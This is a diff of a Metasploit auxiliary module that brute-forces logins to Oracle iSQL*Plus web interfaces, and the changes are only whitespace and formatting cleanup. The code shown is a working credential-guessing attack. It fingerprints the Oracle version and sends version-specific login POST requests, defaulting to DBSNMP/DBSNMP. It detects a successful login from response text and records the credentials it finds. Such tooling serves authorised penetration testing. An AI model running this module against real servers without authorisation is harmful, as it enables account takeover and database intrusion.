@@ -3,7 +3,7 @@
 ##
 
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/Framework/
@@ -28,7 +28,7 @@ class Metasploit3 < Msf::Auxiliary
 				by the USER_FILE, PASS_FILE, and USERPASS_FILE.
 
 				This module does not require a valid SID, but if one is defined, it will be used.
-				Works against Oracle 9.2, 10.1 & 10.2 iSQL*Plus.  This module will attempt to 
+				Works against Oracle 9.2, 10.1 & 10.2 iSQL*Plus.  This module will attempt to
 				fingerprint the version and automatically select the correct POST request.
 
 			},
@@ -72,8 +72,8 @@ class Metasploit3 < Msf::Auxiliary
 			res = send_request_cgi({
 				'version' => '1.1',
 				'uri'     => uri,
-				'method'  => 'GET',                                        
-			}, timeout) 
+				'method'  => 'GET',
+			}, timeout)
 			oracle_ver = nil
 			if (res.nil?)
 				print_error("#{msg} no response")
@@ -113,10 +113,10 @@ class Metasploit3 < Msf::Auxiliary
 
 	def run_host(ip)
 		datastore['BLANK_PASSWORDS'] = false # Always
-		ver = get_oracle_version(ip) 
+		ver = get_oracle_version(ip)
 		if not check_oracle_version(ver)
 			print_error "#{msg} Unknown Oracle version, skipping."
-			return 
+			return
 		end
 		if datastore['SID'].nil? || datastore['SID'].empty?
 			print_status "Using blank SID for authentication."
@@ -129,7 +129,7 @@ class Metasploit3 < Msf::Auxiliary
 				do_login(user, pass, ver)
 			end
 		end
- 	end
+	end
 
 	def sid
 		if datastore['SID'].nil? || datastore['SID'].empty?
@@ -139,30 +139,27 @@ class Metasploit3 < Msf::Auxiliary
 		end
 	end
 
- 	def do_login(user='DBSNMP', pass='DBSNMP', version=9.0)
+	def do_login(user='DBSNMP', pass='DBSNMP', version=9.0)
 		uri = datastore['URI']
 
 		vprint_status("#{msg} Trying username:'#{user}' with password:'#{pass}' with SID '#{sid}'")
-	 	success = false
-		if version == 9.0 
+		success = false
+		if version == 9.0
 			postrequest = "action=logon&sqlcmd=&sqlparms=&username=#{user}&password=#{pass}&sid=#{sid}&privilege=&Log+In=%B5%C7%C2%BC"
-		elsif (version == 9.1 || version == 9.2) 
+		elsif (version == 9.1 || version == 9.2)
 			postrequest = "action=logon&username=#{user}&password=#{pass}&sid=#{sid}&login=Login"
 		elsif (version == 10)
 			postrequest = "username=#{user}&password=#{pass}&connectID=#{sid}&report=&script=&dynamic=&type=&action=&variables=&event=login"
 		end
 		
-		begin 
+		begin
 			res = send_request_cgi({
 				'version' => '1.1',
 				'uri'     => uri,
 				'method'  => 'POST',
 				'data'   => postrequest,
-				'headers' =>
-	                       		{
-				    		'Referer' => "http://#{rhost}:#{rport}#{uri}"
-					}	                                                                
-				}, timeout) 
+				'headers' => { 'Referer' => "http://#{rhost}:#{rport}#{uri}" }
+				}, timeout)
 			unless (res.kind_of? Rex::Proto::Http::Response)
 				vprint_error("#{msg} Not responding")
 				return :abort
@@ -172,9 +169,9 @@ class Metasploit3 < Msf::Auxiliary
 			if res.code == 200
 				# English, German, and Danish.
 				if (res.body =~ /Connected as/ or res.body =~ /Angemeldet als/ or res.body =~ /Arbejdssk/)
- 					success = true
+					success = true
 				elsif (res.body =~ /ORA-01017:/ or res.body =~ /ORA-28273:/)
-					#print_error("received ORA-01017 -- incorrect credentials") 
+					#print_error("received ORA-01017 -- incorrect credentials")
 					success = false
 				elsif (res.body =~ /ORA-28009:/ )
 					print_good("#{user}:#{pass} is correct but required SYSDBA or SYSOPER login")
@@ -206,7 +203,7 @@ class Metasploit3 < Msf::Auxiliary
 			report_isqlplus_service(target_host,res)
 			report_oracle_sid(target_host,sid)
 			report_isqlauth_info(target_host,user,pass,sid)
- 			return :next_user
+			return :next_user
 		else
 			vprint_status "#{msg} username and password failed"
 			return :failed
